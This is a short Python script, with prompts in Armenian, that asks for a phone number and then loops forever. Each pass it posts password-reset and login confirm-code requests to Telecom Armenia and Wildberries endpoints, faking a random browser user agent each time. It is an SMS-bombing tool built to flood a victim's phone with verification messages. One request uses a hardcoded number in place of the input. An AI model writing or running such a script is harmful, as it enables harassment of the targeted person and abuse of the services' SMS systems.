import fake_useragent
import requests
import time


phone_number = int(input('Գրեք համարը (առանց +374): '))

while True:
    user = fake_useragent.UserAgent().random
    headers = {'user_agent' : user}

    try:
        respons = requests.post('https://www.telecomarmenia.am/api/hy/forgot-password/mob/request', headers=headers, data= {'phone': 99898967})
        print('Ողղարկված է')
    except:
        print('Error')
    time.sleep(5)

    try:
        response = requests.post('https://www.wildberries.ru/webapi/security/spa/checkcatpcharequirements?forAction=EasyLogin', headers=headers, data={'phoneMobile': phone_number})
        print('Ողղարկված է')
    except:
        print('Error')
    try:
        response = requests.post('https://www.wildberries.ru/webapi/lk/mobile/requestconfirmcode?forAction=EasyLogin', headers=headers, 
                    json={
                        'confirmCode': "153985",
                        'country': "AM",
                        'deviceId': "1673444226115z8puERz",
                        'osType': "Web",
                        'phoneNumber':  phone_number})
        print('Ուղղարկված է')
    except:
        print('Error')
    time.sleep(5)